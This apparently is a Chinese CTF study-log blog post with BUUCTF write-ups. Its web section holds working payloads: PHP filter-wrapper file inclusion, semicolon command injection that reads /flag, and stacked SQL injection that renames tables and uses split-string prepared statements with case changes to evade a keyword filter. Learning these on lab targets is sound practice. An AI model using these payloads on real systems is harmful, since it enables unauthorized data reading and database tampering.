# BUUCTF-堆叠注入-文件包含

第五周学习-3.28

**目录**

[TOC]



## Web

### [ACTF2020 新生赛]Include

提示我们是include 文件包含



<img src="https://i-blog.csdnimg.cn/blog_migrate/e7661a783f76c7121c9c1e32f5c3a0ca.png" alt="" style="max-height:260px; box-sizing:content-box;" />


打开环境点击



<img src="https://i-blog.csdnimg.cn/blog_migrate/4bf1b2df736d65b982d22629439ba320.png" alt="" style="max-height:117px; box-sizing:content-box;" />


我们include 尝试直接访问根目录 失败

```cobol
?file 是get形式
```

使用伪协议

```cobol
?file=php://filter/read=convert.base64-encode/resource=flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f598dfebdf45b6c1f57bb08603fab54e.png" alt="" style="max-height:123px; box-sizing:content-box;" />


base64解密



<img src="https://i-blog.csdnimg.cn/blog_migrate/d0f098618888f93baa58ea3507a91070.png" alt="" style="max-height:260px; box-sizing:content-box;" />


 [文件包含支持的伪协议_data伪协议_三月樱的博客-CSDN博客](https://blog.csdn.net/qq_50673174/article/details/124769364#t9) 

### [ACTF2020 新生赛]Exec

这题很简单就直接

```cobol
127.0.0.1;ls
127.0.0.1;ls / 发现flag文件
127.0.0.1；cat /flag
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4a4d00a2e0db3740663326d0fae004e2.png" alt="" style="max-height:201px; box-sizing:content-box;" />




### [强网杯 2019]随便注

这道题已经困惑我很久了 一直遇到就退出 今天认真写一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/01fa93fd673b62ee65f961f743d565b9.png" alt="" style="max-height:392px; box-sizing:content-box;" />


GET

开始判断注入类型



<img src="https://i-blog.csdnimg.cn/blog_migrate/e711837e4e221202cf428127f2976480.png" alt="" style="max-height:174px; box-sizing:content-box;" />


字符 我们先构造万能密码

我们猜测语句像这样

```cobol
select * from x=''1'''
```

所以我们构造

```cobol
select * from x=''1' or '1'='1''
1' or '1'='1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/848736953294d5f283d6ce248f5f8501.png" alt="" style="max-height:621px; box-sizing:content-box;" />


我们开始猜字段

```cobol
1' order by 3#
1' order by 3--+ 
都可以
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b5b37da60ef8725f2a0144f977430765.png" alt="" style="max-height:202px; box-sizing:content-box;" />


2个字段

我们开始注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/94397adbcd7a5c95c1bbd91e1aa9f21f.png" alt="" style="max-height:108px; box-sizing:content-box;" />


发现过滤

这就是今天学习到的 如果 select 过滤了 可以使用 堆叠注入

数据库

```csharp
0'; show databases;#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4a0c236a4f2a88857ef83fec52271efc.png" alt="" style="max-height:708px; box-sizing:content-box;" />


查看表

```csharp
0'; show tables;#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e9eadb8c3d0b6a21336e342f3f2e56dc.png" alt="" style="max-height:385px; box-sizing:content-box;" />


一个一个访问 这里又有一个注意的地方

 ***表名为数字时，要用反引号包起来查询。*** 

```csharp
0';show columns from `1919810931114514`#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/abdb54f1277ee337fea00eac13fe1658.png" alt="" style="max-height:361px; box-sizing:content-box;" />


找到flag 但是无法查看

我们接着查看另一个表

```csharp
0';show columns from words#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/bdc1b94a03a79516e934597e1fd37052.png" alt="" style="max-height:718px; box-sizing:content-box;" />


发现里面有id 和data 两个字段

#### 1.改名

words里面有id和data两个字段



<img src="https://i-blog.csdnimg.cn/blog_migrate/da0b3cd30191b53a4afa48a9618e7f20.png" alt="" style="max-height:327px; box-sizing:content-box;" />


而在最开始的时候 输入1 返回的就是id 和data

所以我们进行改名

```cobol
使用rename 将words改为其他的 然后把1919810931114514改为words 
然后在1919810931114514的表中加上 id这个列 把flag改为data
```

```cobol
0';alter table words rename  to words1;alter table `1919810931114514` rename
to words;alter table words change flag id varchar(50);#

0';
alter table words rename to words1;   把words改为words1
alter table `1919810931114514` rename to words; 把1919810931114514改为words
alter tables words change flag id varchar（50）;#
把flag改为id 然后改变为char类型 输出
```

然后使用万能密码输出

```csharp
1' or 1=1#
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1a7eb7801e0817f5f2ea4bf6688dc741.png" alt="" style="max-height:359px; box-sizing:content-box;" />


学会了过滤select后怎么办 还有改文件名的操作

#### 2.预编译

题目过滤了select 我们使用预编译

我们想要执行

```cobol
select * from `1919810931114514`;
```

预编译语法

```sql
set用于设置变量名和值
prepare用于预备一个语句，并赋予名称，以后可以引用该语句
execute执行语句
deallocate prepare用来释放掉预处理的语句
```

```cobol
-1;set @sql = concat('sel','ect * from`1919810931114514`;');prepare a from @sql;EXECUTE a;#
 
 
-1';
set @sql=concat('sel','ect * from `1919810931114514`;');
set设置@sql变量 和变量的值
prepare a from @sql;
将@sql 赋值给 a
execute a；#
执行a 

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d20ece199527b4af5de35f246e9375ca.png" alt="" style="max-height:179px; box-sizing:content-box;" />


发先过滤了set和prepare 我们进行大小写即可

```cobol
-1';Set @sql = concat('sel','ect * from`1919810931114514`;');Prepare a from @sql;EXECUTE a;#

```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b0b190158ff80b80df4a9396f4d34242.png" alt="" style="max-height:338px; box-sizing:content-box;" />


得到flag

## Crypto

### Url编码



<img src="https://i-blog.csdnimg.cn/blog_migrate/e9877d6d334a8e6b1cad712b7b5571ce.png" alt="" style="max-height:430px; box-sizing:content-box;" />


直接解码即可

### 看我回旋踢

下载后打开文件 发现是flag格式

想到凯撒密码

对照ascii发现偏移量为13

```cobol
synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/558c45b91713db2460b6254e8a0f7d6c.png" alt="" style="max-height:559px; box-sizing:content-box;" />


## Misc

### 你竟然赶我走

下载文件

 [CTF-Misc基础知识之图片及各种工具_ctf图片修复_Ke1R的博客-CSDN博客](https://blog.csdn.net/m0_62770485/article/details/124231894) 

打开Stegsolve.jar

放入图片



<img src="https://i-blog.csdnimg.cn/blog_migrate/3337103b11a6433c45a0eb878ddb9b8a.png" alt="" style="max-height:567px; box-sizing:content-box;" />


选择这个 点击得到flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/6102fd11b6c362631890da15d2845750.png" alt="" style="max-height:424px; box-sizing:content-box;" />


### 大白

下载文件 kali打开报错



<img src="https://i-blog.csdnimg.cn/blog_migrate/a0e2583d4b83639603a2d9d85ffaab3c.png" alt="" style="max-height:234px; box-sizing:content-box;" />


是修改高度的错误

我们打开010

并且打开图片属性 查看分辨率为679x256

679为2A7

我们把高度修改为2A7即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/2823e2a8d9959600d05f316ece47dcf4.png" alt="" style="max-height:146px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/33fdd32b39b37154dc734396aee67995.png" alt="" style="max-height:540px; box-sizing:content-box;" />




flag出现

## Reverse

### reverse2

放入ida64

F5反编译



<img src="https://i-blog.csdnimg.cn/blog_migrate/d0a045b79937f7de37c13151b29151c9.png" alt="" style="max-height:552px; box-sizing:content-box;" />


和之前的差不多 变判断flag的内容

flag双击进去内容为

```undefined
hacking_for_fun}
```

所以我们套上壳

```undefined
flag{hacking_for_fun}
```

进行选择flag然后看看哪里更改了flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/60624c3dc5378a2be6c93bce6a9fa01a.png" alt="" style="max-height:117px; box-sizing:content-box;" />


在这里发现了更改 我已经编译过了

只要选中数字 按r就可以改为这个 我们发现他把i和r都改为1

我们也更改即可

```cobol
flag{hack1ng_fo1_fun}
```

### 内涵的软件

下载放入ida32 F5反编译



<img src="https://i-blog.csdnimg.cn/blog_migrate/affd939770dffc6227fb2f37f908093b.png" alt="" style="max-height:273px; box-sizing:content-box;" />


点击进入函数



<img src="https://i-blog.csdnimg.cn/blog_migrate/c31318cfda2d6b4f23bc63f931223cff.png" alt="" style="max-height:148px; box-sizing:content-box;" />


得到flag

更改为flag格式即可